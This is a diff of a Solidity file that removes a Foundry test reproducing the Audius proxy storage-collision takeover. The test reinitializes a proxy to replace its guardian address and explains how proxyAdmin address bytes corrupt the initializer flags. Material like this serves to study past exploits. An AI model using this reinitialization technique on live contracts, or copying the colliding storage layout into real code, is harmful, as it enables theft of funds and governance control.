@@ -1,10 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity ^0.8.18;
 
-import "forge-std/Test.sol";
 import "@openzeppelin/contracts/proxy/transparent/TransparentUpgradeableProxy.sol";
-
-// https://blog.audius.co/article/audius-governance-takeover-post-mortem-7-23-22
 
 interface ILogic {
     function getguardianAddress() external returns (address);
@@ -18,79 +15,6 @@ interface ILogic {
     function getinitialized() external returns (bool);
 
     function isConstructor() external view returns (bool);
-}
-
-contract ContractTest is Test {
-    Logic LogicContract;
-    TestProxy ProxyContract;
-
-    function testStorageCollision() public {
-        LogicContract = new Logic();
-        ProxyContract = new TestProxy(
-            address(LogicContract),
-            address(msg.sender),
-            address(this)
-        );
-
-        console.log(
-            "Current guardianAddress:",
-            ILogic(address(ProxyContract)).getguardianAddress()
-        );
-        console.log(
-            "Current initializing boolean:",
-            ILogic(address(ProxyContract)).getinitializing()
-        );
-        console.log(
-            "Current initialized boolean:",
-            ILogic(address(ProxyContract)).getinitialized()
-        );
-        console.log("Try to call initialize to change guardianAddress");
-        ILogic(address(ProxyContract)).initialize(address(msg.sender));
-
-        console.log(
-            "After initializing, changed guardianAddress to operator:",
-            ILogic(address(ProxyContract)).getguardianAddress()
-        );
-        console.log(
-            "After initializing,  initializing boolean is still true:",
-            ILogic(address(ProxyContract)).getinitializing()
-        );
-        console.log(
-            "After initializing,  initialized boolean:",
-            ILogic(address(ProxyContract)).getinitialized()
-        );
-
-        /*
-In this case because the last byte of the proxyAdmin address is `0x72`, initialized was interpreted as a truthy value.
-Similarly, because the second byte of the proxyAdmin address is `0xea`,
-initializing was also interpreted as a truthy value. This caused the initializer() modifier to always succeed:
-*/
-
-        console.log("operate completed");
-    }
-
-    receive() external payable {}
-}
-
-contract TestProxy is TransparentUpgradeableProxy {
-    address private proxyAdmin;
-
-    constructor(
-        address _logic,
-        address _admin,
-        address guardianAddress
-    )
-        TransparentUpgradeableProxy(
-            _logic,
-            _admin,
-            abi.encodeWithSelector(
-                bytes4(0xc4d66de8), // bytes4(keccak256("initialize(address)"))
-                guardianAddress
-            )
-        )
-    {
-        proxyAdmin = _admin;
-    }
 }
 
 contract Initializable {
